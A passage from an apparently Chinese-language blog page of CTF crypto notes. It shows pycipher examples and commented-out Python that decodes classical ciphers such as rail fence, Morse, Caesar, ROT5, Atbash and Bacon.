pycipher.Affine(17,-8).decipher(&#x27;szzyfimhyzd&#x27;)</span><br><span class="line">&#x27;AFFINESHIFT&#x27;</span><br></pre></td></tr></table></figure><p>Vigenere 维吉尼亚密码快速实现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import pycipher</span><br><span class="line">&gt;&gt;&gt; pycipher.Vigenere(&quot;abc&quot;).decipher(&#x27;Vjieogrf&#x27;)</span><br><span class="line">&#x27;VIGENERE&#x27;</span><br></pre></td></tr></table></figure><p>列置换快速实现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import pycipher</span><br><span class="line">&gt;&gt;&gt; pycipher.ColTrans(&#x27;nice&#x27;).encipher(&#x27;ilovepythonandctf&#x27;)</span><br><span class="line">&#x27;OYNCVTATLPODIEHNF&#x27;</span><br><span class="line">&gt;&gt;&gt; pycipher.ColTrans(&#x27;nice&#x27;).decipher(&#x27;OYNCVTATLPODIEHNF&#x27;)</span><br><span class="line">&#x27;ILOVEPYTHONANDCTF&#x27;</span><br></pre></td></tr></table></figure><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br></pre></td><td class="code"><pre><span class="line"># 栅栏加解密</span><br><span class="line"># crypto=&#x27;flag&#123;012345&#125;&#x27;</span><br><span class="line"># for i in range(0,6):</span><br><span class="line">#     for n in range(i,len(crypto),6):</span><br><span class="line">#         print(crypto[n],end=&#x27;&#x27;)</span><br><span class="line"># print()</span><br><span class="line"># zhalan=&#x27;f1l2a3g4&#123;50&#125;&#x27;</span><br><span class="line"># for i in range(0,2):</span><br><span class="line">#     for n in range(i,len(zhalan),2):</span><br><span class="line">#         print(zhalan[n], end=&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># # 栅栏加解密合并</span><br><span class="line"># def railfence(content):</span><br><span class="line">#     all=[]</span><br><span class="line">#     for key in range(2,len(content)):</span><br><span class="line">#         flag=&#x27;&#x27;</span><br><span class="line">#         if len(content)%key==0:</span><br><span class="line">#             for i in range(0, key):</span><br><span class="line">#                 for n in range(i, len(content), key):</span><br><span class="line">#                     flag=flag+content[n]</span><br><span class="line">#                     # print(content[n], end=&#x27;&#x27;)</span><br><span class="line">#             all.append(&#x27;栏数为:&#123;0&#125;时,结果为:&#123;1&#125;&#x27;.format(key,flag))</span><br><span class="line">#     print(all)</span><br><span class="line">#     print(len(all))</span><br><span class="line"># if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">#     content=&#x27;flag&#123;012345&#125;&#x27;</span><br><span class="line">#     railfence(content)</span><br><span class="line">#     content=&#x27;f&#123;3l04a15g2&#125;&#x27;</span><br><span class="line">#     railfence(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># #莫斯密码加解密</span><br><span class="line"># def mosdecrypt(content):</span><br><span class="line">#     MorseList = &#123;&#x27;A&#x27;: &quot;.-&quot;, &#x27;B&#x27;: &quot;-...&quot;, &#x27;C&#x27;: &quot;-.-.&quot;, &#x27;D&#x27;: &quot;-..&quot;, &#x27;E&#x27;: &quot;.&quot;, &#x27;F&#x27;: &quot;..-.&quot;, &#x27;G&#x27;: &quot;--.&quot;,</span><br><span class="line">#                  &#x27;H&#x27;: &quot;....&quot;, &#x27;I&#x27;: &quot;..&quot;, &#x27;J&#x27;: &quot;.---&quot;, &#x27;K&#x27;: &quot;-.-&quot;, &#x27;L&#x27;: &quot;.-..&quot;, &#x27;M&#x27;: &quot;--&quot;, &#x27;N&#x27;: &quot;-.&quot;,</span><br><span class="line">#                  &#x27;O&#x27;: &quot;---&quot;, &#x27;P&#x27;: &quot;.--.&quot;, &#x27;Q&#x27;: &quot;--.-&quot;, &#x27;R&#x27;: &quot;.-.&quot;, &#x27;S&#x27;: &quot;...&quot;, &#x27;T&#x27;: &quot;-&quot;, &#x27;U&#x27;: &quot;..-&quot;,</span><br><span class="line">#                  &#x27;V&#x27;: &quot;...-&quot;, &#x27;W&#x27;: &quot;.--&quot;, &#x27;X&#x27;: &quot;-..-&quot;, &#x27;Y&#x27;: &quot;-.--&quot;, &#x27;Z&#x27;: &quot;--..&quot;,</span><br><span class="line">#                  &#x27;1&#x27;: &quot;.----&quot;, &#x27;2&#x27;: &quot;..---&quot;, &#x27;3&#x27;: &quot;...--&quot;, &#x27;4&#x27;: &quot;....-&quot;, &#x27;5&#x27;: &quot;.....&quot;,</span><br><span class="line">#                  &#x27;6&#x27;: &quot;-....&quot;, &#x27;7&#x27;: &quot;--...&quot;, &#x27;8&#x27;: &quot;---..&quot;, &#x27;9&#x27;: &quot;----.&quot;, &#x27;0&#x27;: &quot;-----&quot;,</span><br><span class="line">#                  &#x27;.&#x27;: &quot;.-.-.-&quot;, &#x27;?&#x27;: &quot;..--..&quot;, &#x27;!&#x27;: &quot;-.-.--&quot;, &#x27;(&#x27;: &quot;-.--.&quot;, &#x27;@&#x27;: &quot;.--.-.&quot;, &#x27;:&#x27;: &quot;---...&quot;,</span><br><span class="line">#                  &#x27;=&#x27;: &quot;-...-&quot;, &#x27;-&#x27;: &quot;-....-&quot;, &#x27;)&#x27;: &quot;-.--.-&quot;, &#x27;,&#x27;: &quot;--..--&quot;, &#x27;\&#x27;&#x27;: &quot;.----.&quot;, &#x27;_&#x27;: &quot;..--.-&quot;,</span><br><span class="line">#                  &#x27;$&#x27;: &quot;...-..-&quot;, &#x27;;&#x27;: &quot;-.-.-.&quot;, &#x27;/&#x27;: &quot;-..-.&quot;, &#x27;\&quot;&#x27;: &quot;.-..-.&quot;, &#x27;&amp;&#x27;: &quot;.-...&quot;,</span><br><span class="line">#                  &#x27;+&#x27;: &quot;.-.-.&quot;,</span><br><span class="line">#                  &#x27;à&#x27;: &quot;.--.-&quot;, &#x27;ä&#x27;: &quot;.-.-&quot;, &#x27;ch&#x27;: &quot;----&quot;, &#x27;ç&#x27;: &quot;-.-..&quot;, &#x27;ð&#x27;: &quot;..--.&quot;,</span><br><span class="line">#                  &#x27;é&#x27;: &quot;..-..&quot;, &#x27;è&#x27;: &quot;.-..-&quot;, &#x27;ĝ&#x27;: &quot;--.-.&quot;, &#x27;ĥ&#x27;: &quot;-.--.&quot;, &#x27;ĵ&#x27;: &quot;.---.&quot;,</span><br><span class="line">#                  &#x27;ñ&#x27;: &quot;--.--&quot;, &#x27;ø&#x27;: &quot;---.&quot;, &#x27;ŝ&#x27;: &quot;...-.&quot;, &#x27;þ&#x27;: &quot;.--..&quot;, &#x27;ü&#x27;: &quot;..--&quot;,&#125;</span><br><span class="line">#     if &#x27;0&#x27; in content and &#x27;1&#x27; in content:</span><br><span class="line">#         trans = &#x27;&#x27;.maketrans(&#x27;01&#x27;, &#x27;.-&#x27;)</span><br><span class="line">#         content = content.translate(trans)</span><br><span class="line">#     if &#x27;－&#x27; in content or &#x27;·&#x27; in content:</span><br><span class="line">#         content=content.replace(&#x27;－&#x27;,&#x27;-&#x27;)</span><br><span class="line">#         content=content.replace(&#x27;·&#x27;,&#x27;.&#x27;)</span><br><span class="line">#     if &#x27;/&#x27; in content:</span><br><span class="line">#         lmorsecodeList = content.split(&quot;/&quot;)</span><br><span class="line">#     else:</span><br><span class="line">#         content = content.replace(&#x27; &#x27;, &#x27;/&#x27;)</span><br><span class="line">#         if &#x27;///&#x27; in  content:</span><br><span class="line">#             content = content.replace(&#x27;///&#x27;, &#x27;/ /&#x27;)</span><br><span class="line">#         lmorsecodeList = content.split(&quot;/&quot;)</span><br><span class="line">#     print(lmorsecodeList)</span><br><span class="line">#     flag = &#x27;&#x27;</span><br><span class="line">#     for char in lmorsecodeList:</span><br><span class="line">#         if char ==&#x27; &#x27;:</span><br><span class="line">#             flag = flag +  char</span><br><span class="line">#         for k, v in MorseList.items():</span><br><span class="line">#             if v == char:</span><br><span class="line">#                 flag = flag + k</span><br><span class="line">#     print(&quot;莫斯密码小写:&quot;, flag)</span><br><span class="line">#     print(&quot;莫斯密码大写:&quot;, flag.lower())</span><br><span class="line">#     return flag</span><br><span class="line"># content=&#x27;··   ·－·· －－－ ···－ ·   －·－－ －－－ ··－ &#x27;</span><br><span class="line"># print(content.split(&quot; &quot;))</span><br><span class="line"># print(mosdecrypt(content))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># # 凯撒密码</span><br><span class="line"># def caesar_Crypto(content):</span><br><span class="line">#     all_plain=[]</span><br><span class="line">#     for num in range(1,26):</span><br><span class="line">#         plain = &#x27;&#x27;</span><br><span class="line">#         for i in content:</span><br><span class="line">#             if i.islower():#小写字母</span><br><span class="line">#                 plain = plain + chr(97 + (ord(i) + num - 97) % 26)</span><br><span class="line">#             elif i.isupper():#大写字母</span><br><span class="line">#                 plain = plain + chr(65 + (ord(i) + num - 65) % 26)</span><br><span class="line">#             else:#上面两者都不是</span><br><span class="line">#                 plain=plain+i</span><br><span class="line">#         print(plain)</span><br><span class="line">#         all_plain.append(plain)</span><br><span class="line">#     print(all_plain)</span><br><span class="line"># content=&#x27;IODJ&#123;Khuh_lv_brxu_iodj&#125;&#x27;</span><br><span class="line"># caesar_Crypto(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># # 凯撒密码新思路</span><br><span class="line"># 实现循环</span><br><span class="line"># crypto=&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span><br><span class="line"># for i in range(len(crypto)):</span><br><span class="line">#     print(crypto[i:]+crypto[:i])</span><br><span class="line"># def caesar_Crypto(content):</span><br><span class="line">#     all_plain=[]</span><br><span class="line">#     lowercase = &#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span><br><span class="line">#     uppercase = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br><span class="line">#     for num in range(1,26):</span><br><span class="line">#         lower=lowercase[num:]+lowercase[:num]</span><br><span class="line">#         upper=uppercase[num:]+uppercase[:num]</span><br><span class="line">#         plain=&#x27;&#x27;</span><br><span class="line">#         table=&#x27;&#x27;.maketrans(lower+upper,lowercase+uppercase)</span><br><span class="line">#         for i in content:</span><br><span class="line">#             plain=plain+i.translate(table)</span><br><span class="line">#         all_plain.append(plain)</span><br><span class="line">#         print(plain)</span><br><span class="line">#     print(all_plain)</span><br><span class="line"># content=&#x27;IODJ&#123;Khuh_lv_brxu_iodj&#125;&#x27;</span><br><span class="line"># caesar_Crypto(content)</span><br><span class="line"># 变异凯撒</span><br><span class="line"># str=&quot;afZ_r9VYfScOeO_UL^RWUc&quot;</span><br><span class="line"># a=5</span><br><span class="line"># for i in str:</span><br><span class="line">#     print(chr(ord(i)+a),end=&#x27;&#x27;)</span><br><span class="line">#     a=a+1</span><br><span class="line"></span><br><span class="line"># ROT5</span><br><span class="line"># def caesar_Crypto(content):</span><br><span class="line">#     all_plain=[]</span><br><span class="line">#     lowercase = &#x27;0123456789&#x27;</span><br><span class="line">#     lower=lowercase[5:]+lowercase[:5]</span><br><span class="line">#     plain=&#x27;&#x27;</span><br><span class="line">#     table=&#x27;&#x27;.maketrans(lower,lowercase)</span><br><span class="line">#     for i in content:</span><br><span class="line">#         plain=plain+i.translate(table)</span><br><span class="line">#     all_plain.append(plain)</span><br><span class="line">#     print(plain)</span><br><span class="line"># content=&#x27;flag&#123;5678901&#125;&#x27;</span><br><span class="line"># caesar_Crypto(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Atbash Cipher</span><br><span class="line"># def caesar_Crypto(content):</span><br><span class="line">#     all_plain=[]</span><br><span class="line">#     lowercase = &#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span><br><span class="line">#     lower=lowercase[::-1]#此处需要修改</span><br><span class="line">#     plain=&#x27;&#x27;</span><br><span class="line">#     table=&#x27;&#x27;.maketrans(lower,lowercase)</span><br><span class="line">#     for i in content:</span><br><span class="line">#         plain=plain+i.translate(table)</span><br><span class="line">#     all_plain.append(plain)</span><br><span class="line">#     print(plain)</span><br><span class="line"># content=&#x27;the quick brown fox jumps over the lazy dog&#x27;</span><br><span class="line"># caesar_Crypto(content)</span><br><span class="line"># content=&#x27;gsv jfrxp yildm ulc qfnkh levi gsv ozab wlt&#x27;</span><br><span class="line"># caesar_Crypto(content)</span><br><span class="line"># #flag&#123;0123456&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 培根密码大小写提取</span><br><span class="line"># a=&#x27;SjkLnIljKHamJmkilABawiiioaAMbOaPIJmklNBaKijmBuaoljiAUWMakMHWNAakm&#x27;</span><br><span class="line"># flag=&#x27;&#x27;</span><br><span class="line"># for i in a:</span><br><span class="line">#     if i.islower():</span><br><span class="line">#         flag+=&#x27;A&#x27;</span><br><span class="line">#     elif i.isupper():</span><br><span class="line">#         flag+=&quot;B&quot;</span><br><span class="line"># print(flag)</span><br><span class="line"># table=&#x27;&#x27;.maketrans(&quot;AB&quot;,&quot;BA&quot;)</span><br><span class="line"># print(flag.translate(table))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 列表转换成字典</span><br><span class="line"># alphabet = [&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;d&#x27;,&#x27;e&#x27;,&#x27;f&#x27;,&#x27;g&#x27;,&#x27;h&#x27;,&#x27;i&#x27;,&#x27;j&#x27;,&#x27;k&#x27;,&#x27;l&#x27;,&#x27;m&#x27;,&#x27;n&#x27;,&#x27;o&#x27;,&#x27;p&#x27;,&#x27;q&#x27;,&#x27;r&#x27;,&#x27;s&#x27;,&#x27;t&#x27;,&#x27;u&#x27;,&#x27;v&#x27;,&#x27;w&#x27;,&#x27;x&#x27;,&#x27;y&#x27;,&#x27;z&#x27;]</span><br><span class="line"># cipher = [&quot;aaaaa&quot;,&quot;aaaab&quot;,&quot;aaaba&quot;,&quot;aaabb&quot;,&quot;aabaa&quot;,&quot;aabab&quot;,&quot;aabba&quot;,&quot;aabbb&quot;,&quot;abaaa&quot;,&quot;abaab&quot;,&quot;ababa&quot;,&quot;ababb&quot;,&quot;abbaa&quot;,&quot;abbab&quot;,&quot;abbba&quot;,&quot;abbbb&quot;,&quot;baaaa&quot;,&quot;baaab&quot;,&quot;baaba&quot;,&quot;baabb&quot;,&quot;babaa&quot;,&quot;babab&quot;,&quot;babba&quot;,&quot;babbb&quot;,&quot;bbaaa&quot;,&quot;bbaab&quot;]</span><br><span class="line"># print(dict(zip(alphabet,cipher)))</span><br><span class="line"># #&#123;&#x27;a&#x27;: &#x27;aaaaa&#x27;, &#x27;b&#x27;: &#x27;aaaab&#x27;, &#x27;c&#x27;: &#x27;aaaba&#x27;, &#x27;d&#x27;: &#x27;aaabb&#x27;, &#x27;e&#x27;: &#x27;aabaa&#x27;, &#x27;f&#x27;: &#x27;aabab&#x27;, &#x27;g&#x27;: &#x27;aabba&#x27;, &#x27;h&#x27;: &#x27;aabbb&#x27;, &#x27;i&#x27;: &#x27;abaaa&#x27;, &#x27;j&#x27;: &#x27;abaab&#x27;, &#x27;k&#x27;: &#x27;ababa&#x27;, &#x27;l&#x27;: &#x27;ababb&#x27;, &#x27;m&#x27;: &#x27;abbaa&#x27;, &#x27;n&#x27;: &#x27;abbab&#x27;, &#x27;o&#x27;: &#x27;abbba&#x27;, &#x27;p&#x27;: &#x27;abbbb&#x27;, &#x27;q&#x27;: &#x27;baaaa&#x27;, &#x27;r&#x27;: &#x27;baaab&#x27;, &#x27;s&#x27;: &#x27;baaba&#x27;, &#x27;t&#x27;: &#x27;baabb&#x27;, &#x27;u&#x27;: &#x27;babaa&#x27;, &#x27;v&#x27;: &#x27;babab&#x27;, &#x27;w&#x27;: &#x27;babba&#x27;, &#x27;x&#x27;: &#x27;babbb&#x27;, &#x27;y&#x27;: &#x27;bbaaa&#x27;, &#x27;z&#x27;: &#x27;bbaab&#x27;&#125;</span><br><span class="line"></span><br><span class="line"># 培根密码26长度</span><br><span class="line"># txt = &#x27;SjkLnIljKHamJmkilABawiiioaAMbOaPIJmklNBaKijmBuaoljiAUWMakMHWNAakm&#x27;</span><br><span class="line"># content = &#x27;&#x27;</span><br><span class="line"># for i in txt:</span><br><span class="line">#     if i.islower():</span><br><span class="line">#         content += &#x27;a&#x27;</span><br><span class="line">#     elif i.isupper():</span><br><span class="line">#         content += &quot;b&quot;</span><br><span class="line"># if len(content) % 5 == 0:</span><br><span class="line">#     # alphabet = [&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;d&#x27;,&#x27;e&#x27;,&#x27;f&#x27;,&#x27;g&#x27;,&#x27;h&#x27;,&#x27;i&#x27;,&#x27;j&#x27;,&#x27;k&#x27;,&#x27;l&#x27;,&#x27;m&#x27;,&#x27;n&#x27;,&#x27;o&#x27;,&#x27;p&#x27;,&#x27;q&#x27;,&#x27;r&#x27;,&#x27;s&#x27;,&#x27;t&#x27;,&#x27;u&#x27;,&#x27;v&#x27;,&#x27;w&#x27;,&#x27;x&#x27;,&#x27;y&#x27;,&#x27;z&#x27;]</span><br><span class="line">#     alphabet = [chr(i) for i in range(ord(&#x27;a&#x27;), ord(&#x27;z&#x27;) + 1)]</span><br><span class="line">#     cipher = [&quot;aaaaa&quot;, &quot;aaaab&quot;, &quot;aaaba&quot;, &quot;aaabb&quot;, &quot;aabaa&quot;, &quot;aabab&quot;, &quot;aabba&quot;, &quot;aabbb&quot;, &quot;abaaa&quot;, &quot;abaab&quot;, &quot;ababa&quot;,</span><br><span class="line">#               &quot;ababb&quot;, &quot;abbaa&quot;, &quot;abbab&quot;, &quot;abbba&quot;, &quot;abbbb&quot;, &quot;baaaa&quot;, &quot;baaab&quot;, &quot;baaba&quot;, &quot;baabb&quot;, &quot;babaa&quot;, &quot;babab&quot;,</span><br><span class="line">#               &quot;babba&quot;, &quot;babbb&quot;, &quot;bbaaa&quot;, &quot;bbaab&quot;]</span><br><span class="line">#     key = dict(zip(cipher, alphabet))  # 生成键值对应的字典</span><br><span class="line">#     try:</span><br><span class="line">#         flag = &#x27;&#x27;</span><br><span class="line">#         for i in range(0, len(content), 5):</span><br><span class="line">#             value = content[i:i + 5]  # 切片</span><br><span class="line">#             flag += key.get(value)  # 取键值</span><br><span class="line">#     except:</span><br><span class="line">#         flag = &#x27;&#x27;</span><br><span class="line">#         table = &#x27;&#x27;.maketrans(&quot;ab&quot;, &quot;ba&quot;)</span><br><span class="line">#         content = content.translate(table)</span><br><span class="line">#         for i in range(0, len(content), 5):</span><br><span class="line">#             value = content[i:i + 5]  # 切片</span><br><span class="line">#             flag += key.get(value)  # 取键值</span><br><span class="line">#     print(flag)</span><br><span class="line"># else:</span><br><span class="line">#     print(&quot;不是培根密码&quot;)</span><br><span class="line">#</span><br><span class="line"># 培根密码24长度</span><br><span class="line"># txt = &#x27;SjkLnIljKHamJmkilABawiiioaAMbOaPIJmklNBaKijmBuaoljiAUWMakMHWNAakm&#x27;</span><br><span class="line"># content = &#x27;&#x27;</span><br><span class="line"># for i in txt:</span><br><span class="line">#     if i.islower():</span><br><span class="line">#         content += &#x27;a&#x27;</span><br><span class="line">#     elif i.isupper():</span><br><span class="line">#         content += &quot;b&quot;</span><br><span class="line"># content=&#x27;ABABAABAAABAABBAABAA&#x27;.lower()</span><br><span class="line"># if len(content) % 5 == 0:</span><br><span class="line">#     alphabet = [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;, &#x27;(ij)&#x27;, &#x27;k&#x27;, &#x27;l&#x27;, &#x27;m&#x27;, &#x27;n&#x27;, &#x27;o&#x27;, &#x27;p&#x27;, &#x27;q&#x27;, &#x27;r&#x27;, 